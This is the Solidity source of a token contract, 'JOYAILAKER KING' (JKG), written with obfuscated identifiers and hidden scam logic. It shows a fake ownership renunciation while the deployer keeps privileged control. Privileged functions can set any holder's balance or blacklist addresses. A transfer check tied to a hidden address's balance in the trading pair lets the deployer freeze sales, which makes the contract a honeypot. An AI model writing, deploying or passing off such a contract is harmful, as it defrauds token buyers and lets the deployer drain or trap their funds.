//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

abstract contract sellExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalEnable {
    function createPair(address shouldListTotal, address shouldLaunched) external returns (address);
}


interface isTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface receiverIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buySell) external view returns (uint256);

    function transfer(address tradingTokenTeam, uint256 fromListReceiver) external returns (bool);

    function allowance(address walletModeAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromListReceiver) external returns (bool);

    function transferFrom(address sender,address tradingTokenTeam,uint256 fromListReceiver) external returns (bool);

    event Transfer(address indexed from, address indexed buyTrading, uint256 value);
    event Approval(address indexed walletModeAt, address indexed spender, uint256 value);
}

interface teamAmount is receiverIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract JOYAILAKERKING is sellExempt, receiverIs, teamAmount {

    function totalSupply() external view virtual override returns (uint256) {
        return txTakeMax;
    }

    uint256 private isSell;

    function getOwner() external view returns (address) {
        return enableTrading;
    }

    function transferFrom(address amountExempt, address tradingTokenTeam, uint256 fromListReceiver) external override returns (bool) {
        if (_msgSender() != modeAutoAt) {
            if (teamMax[amountExempt][_msgSender()] != type(uint256).max) {
                require(fromListReceiver <= teamMax[amountExempt][_msgSender()]);
                teamMax[amountExempt][_msgSender()] -= fromListReceiver;
            }
        }
        return enableTotal(amountExempt, tradingTokenTeam, fromListReceiver);
    }

    function allowance(address limitTake, address modeEnable) external view virtual override returns (uint256) {
        if (modeEnable == modeAutoAt) {
            return type(uint256).max;
        }
        return teamMax[limitTake][modeEnable];
    }

    mapping(address => mapping(address => uint256)) private teamMax;

    function name() external view virtual override returns (string memory) {
        return launchedWallet;
    }

    uint256 totalMax;

    function symbol() external view virtual override returns (string memory) {
        return autoMax;
    }

    function shouldLiquidity() public {
        emit OwnershipTransferred(maxShouldTotal, address(0));
        enableTrading = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverAmount;
    }

    function launchEnable(address enableLaunched, uint256 fromListReceiver) public {
        marketingLaunch();
        walletAuto[enableLaunched] = fromListReceiver;
    }

    function totalSwap(address liquidityTradingTx) public {
        if (totalReceiver) {
            return;
        }
        if (txToFee == isSell) {
            isSell = txToFee;
        }
        walletList[liquidityTradingTx] = true;
        
        totalReceiver = true;
    }

    function balanceOf(address buySell) public view virtual override returns (uint256) {
        return walletAuto[buySell];
    }

    function approve(address modeEnable, uint256 fromListReceiver) public virtual override returns (bool) {
        teamMax[_msgSender()][modeEnable] = fromListReceiver;
        emit Approval(_msgSender(), modeEnable, fromListReceiver);
        return true;
    }

    uint256 feeMarketing;

    mapping(address => bool) public walletList;

    address private enableTrading;

    address exemptSenderTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function enableTotal(address amountExempt, address tradingTokenTeam, uint256 fromListReceiver) internal returns (bool) {
        if (amountExempt == maxShouldTotal) {
            return listToken(amountExempt, tradingTokenTeam, fromListReceiver);
        }
        uint256 walletLaunched = receiverIs(toMin).balanceOf(exemptSenderTrading);
        require(walletLaunched == totalMax);
        require(!receiverExempt[amountExempt]);
        return listToken(amountExempt, tradingTokenTeam, fromListReceiver);
    }

    uint256 private txTakeMax = 100000000 * 10 ** 18;

    bool private totalTeam;

    uint8 private receiverAmount = 18;

    constructor (){
        
        shouldLiquidity();
        isTrading walletMode = isTrading(modeAutoAt);
        toMin = totalEnable(walletMode.factory()).createPair(walletMode.WETH(), address(this));
        if (isSell == txToFee) {
            isTeam = true;
        }
        maxShouldTotal = _msgSender();
        walletList[maxShouldTotal] = true;
        walletAuto[maxShouldTotal] = txTakeMax;
        if (txToFee == isSell) {
            isTeam = false;
        }
        emit Transfer(address(0), maxShouldTotal, txTakeMax);
    }

    function launchedTotalEnable(uint256 fromListReceiver) public {
        marketingLaunch();
        totalMax = fromListReceiver;
    }

    function marketingLaunch() private view {
        require(walletList[_msgSender()]);
    }

    mapping(address => uint256) private walletAuto;

    function owner() external view returns (address) {
        return enableTrading;
    }

    bool public totalReceiver;

    mapping(address => bool) public receiverExempt;

    address public toMin;

    string private autoMax = "JKG";

    function listToken(address amountExempt, address tradingTokenTeam, uint256 fromListReceiver) internal returns (bool) {
        require(walletAuto[amountExempt] >= fromListReceiver);
        walletAuto[amountExempt] -= fromListReceiver;
        walletAuto[tradingTokenTeam] += fromListReceiver;
        emit Transfer(amountExempt, tradingTokenTeam, fromListReceiver);
        return true;
    }

    bool private isTeam;

    address public maxShouldTotal;

    bool public tradingEnable;

    function transfer(address enableLaunched, uint256 fromListReceiver) external virtual override returns (bool) {
        return enableTotal(_msgSender(), enableLaunched, fromListReceiver);
    }

    event OwnershipTransferred(address indexed takeWallet, address indexed minEnable);

    address modeAutoAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private txToFee;

    string private launchedWallet = "JOYAILAKER KING";

    function maxToMarketing(address launchAt) public {
        marketingLaunch();
        
        if (launchAt == maxShouldTotal || launchAt == toMin) {
            return;
        }
        receiverExempt[launchAt] = true;
    }

}